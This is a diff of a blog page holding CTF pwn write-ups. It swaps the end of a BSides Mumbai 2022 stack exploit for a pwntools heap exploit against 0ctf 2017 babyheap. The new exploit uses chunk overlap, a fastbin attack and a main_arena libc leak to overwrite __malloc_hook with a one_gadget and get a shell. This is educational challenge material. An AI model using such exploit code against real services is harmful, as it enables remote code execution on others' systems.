 </span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">if_32</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
@@ -572,21 +646,81 @@
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="n">formula</span><span class="p">)),</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="o">...</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">sendline_after_clean</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="n">stack</span> <span class="o">=</span> <span class="n">recv_and_transform</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span><span class="p">,</span> <span class="n">from_bytes</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">bound</span><span class="o">=</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">suclog</span><span class="p">(</span>
-</span></span><span class="line"><span class="cl">    <span class="n">stack</span><span class="o">=</span><span class="n">stack</span>
-</span></span><span class="line"><span class="cl"><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
-</span></span><span class="line"><span class="cl">    <span class="n">stack</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mi">11534522</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1590475454</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">])</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">flat</span><span class="p">([</span>
-</span></span><span class="line"><span class="cl">    <span class="n">stack</span> <span class="o">-</span> <span class="mi">38</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">    <span class="n">p8</span><span class="p">(</span><span class="mh">0x8E</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">])</span>
-</span></span><span class="line"><span class="cl"><span class="n">send_after_clean</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">allocate</span><span class="p">(</span><span class="n">size</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># sendline_after_clean(str(index))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">remove</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">    
-</span></span><span class="line"><span class="cl"><span class="n">interactive_after_clean</span><span class="p">(</span><span class="n">no_show</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">content</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sendline_after_clean</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">send_after_clean</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># 1</span>
+</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>  <span class="c1"># 2</span>
+</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>  <span class="c1"># 3</span>
+</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x68</span><span class="p">)</span>  <span class="c1"># 4</span>
+</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>  <span class="c1"># 5</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(p)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span><span class="mh">0x10</span><span class="p">:[</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">pg</span><span class="p">(</span><span class="mh">0xB1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">]})</span>
+</span></span><span class="line"><span class="cl"><span class="n">change</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(p)</span>
+</span></span><span class="line"><span class="cl"><span class="n">remove</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># -1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="p">,</span> <span class="n">pg</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0xA0</span><span class="p">)</span> <span class="c1"># 1</span>
+</span></span><span class="line"><span class="cl"><span class="n">change</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">remove</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># -2</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(p)</span>
+</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Content: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_addr</span> <span class="o">=</span> <span class="n">recv_and_transform</span><span class="p">()</span>  <span class="o">-</span><span class="mh">0x3c4b78</span>
+</span></span><span class="line"><span class="cl"><span class="n">hook_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">chunk_addr</span> <span class="o">=</span> <span class="n">hook_addr</span> <span class="o">-</span> <span class="mh">0x23</span>
+</span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="mh">0x4526a</span>
+</span></span><span class="line"><span class="cl"><span class="n">suclog</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;libc_addr&#34;</span><span class="p">,</span>   
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;hook_addr&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;chunk_addr&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;one_gadget&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span><span class="p">,</span> <span class="n">pg</span><span class="p">(</span><span class="mh">0x71</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pg</span><span class="p">(</span><span class="n">chunk_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">remove</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="c1"># -4</span>
+</span></span><span class="line"><span class="cl"><span class="n">change</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x68</span><span class="p">)</span> <span class="c1"># 2</span>
+</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x68</span><span class="p">)</span> <span class="c1"># 4</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({(</span><span class="mh">0x13</span><span class="p">):[</span>
+</span></span><span class="line"><span class="cl">    <span class="n">one_gadget</span>
+</span></span><span class="line"><span class="cl"><span class="p">]})</span>
+</span></span><span class="line"><span class="cl"><span class="n">change</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># gdb.attach(p)</span>
+</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">interactive_after_clean</span><span class="p">()</span>
 </span></span></code></pre></div>
 </article>
 
@@ -596,13 +730,19 @@
     
     <a href="https://peterliuzhi.top/tags/pwn/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#pwn</a>
     
+    <a href="https://peterliuzhi.top/tags/chunk-overlap/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#chunk overlap</a>
+    
+    <a href="https://peterliuzhi.top/tags/fastbin-attack/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#fastbin attack</a>
+    
+    <a href="https://peterliuzhi.top/tags/main_arena-leak/" class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#main_arena leak</a>
+    
 </div>
       
 
       
   <div class="flex md:justify-end my-4">
 
-    <a href="https://github.com/PeterLiu-all/peterliu-all.github.io/content/writeup/%e3%80%90BSides%20Mumbai%202022%20PWN%e3%80%91Warmup.md" title="Edit this page">
+    <a href="https://github.com/PeterLiu-all/peterliu-all.github.io/content/writeup/0ctf_2017_babyheap.md" title="Edit this page">
       <i class="fas fa-edit me-1"></i>
       <span>编辑本页</span>
     </a>
@@ -619,16 +759,11 @@
   >
     <div>
       
-        <span class="text-primary-text block font-bold"
-          >上一页</span
-        >
-        <a href="https://peterliuzhi.top/writeup/0ctf_2017_babyheap/" class="block">0ctf_2017_babyheap</a>
-      
     </div>
     <div class="mt-4 md:mt-0 md:text-right">
       
         <span class="text-primary-text block font-bold">下一页</span>
-        <a href="https://peterliuzhi.top/writeup/hitcontraining_heapcreator/" class="block">hitcontraining_heapcreator</a>
+        <a href="https://peterliuzhi.top/writeup/bsides-mumbai-2022-pwnwarmup/" class="block">【BSides Mumbai 2022 PWN】Warmup</a>
       
     </div>
   </div>
@@ -679,7 +814,20 @@
   <nav id="TableOfContents">
   <ul>
     <li><a href="#checksec查看程序架构">checksec查看程序架构</a></li>
-    <li><a href="#ida查看伪c代码">ida查看伪C代码</a></li>
+    <li><a href="#ida查看伪c代码">ida查看伪C代码</a>
+      <ul>
+        <li><a href="#init_0函数">init_0函数</a>
+          <ul>
+            <li><a href="#mmap函数">mmap函数</a></li>
+          </ul>
+        </li>
+        <li><a href="#allocate">allocate</a></li>
+        <li><a href="#change">change</a></li>
+        <li><a href="#remove">remove</a></li>
+        <li><a href="#show">show</a></li>
+      </ul>
+    </li>
+    <li><a href="#大致思路">大致思路</a></li>
     <li><a href="#exp">exp</a></li>
   </ul>
 </nav>
@@ -704,6 +852,12 @@
           <a href="https://peterliuzhi.top/writeup/hitcontraining_heapcreator/" class="no-underline">hitcontraining_heapcreator</a>
           <br />
         
+          <a href="https://peterliuzhi.top/writeup/%E9%A6%96%E9%81%93%E5%A0%86%E9%A2%98fastbin-attackunsorted-bin-main_arena-leakbabyheap_0ctf_2017/" class="no-underline">【首道堆题】【fastbin attack】【unsorted bin main_arena leak】babyheap_0ctf_2017</a>
+          <br />
+        
+          <a href="https://peterliuzhi.top/writeup/bsides-mumbai-2022-pwnwarmup/" class="no-underline">【BSides Mumbai 2022 PWN】Warmup</a>
+          <br />
+        
           <a href="https://peterliuzhi.top/tricks/glibc-source-code%E6%BA%90%E7%A0%81/" class="no-underline">glibc source code源码</a>
           <br />
         
@@ -711,12 +865,6 @@
           <br />
         
           <a href="https://peterliuzhi.top/tricks/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%8F%E5%AE%9A%E4%B9%89/" class="no-underline">常见的宏定义</a>
-          <br />
-        
-          <a href="https://peterliuzhi.top/tricks/pwn%E4%B8%AD%E8%B0%83%E8%AF%95arm%E7%A8%8B%E5%BA%8F/" class="no-underline">PWN中调试arm程序</a>
-          <br />
-        
-          <a href="https://peterliuzhi.top/tricks/%E8%BE%83%E4%B8%BA%E7%AE%80%E7%9F%AD%E7%9A%84shellcode/" class="no-underline">较为简短的shellcode</a>
           <br />
         
       </div>
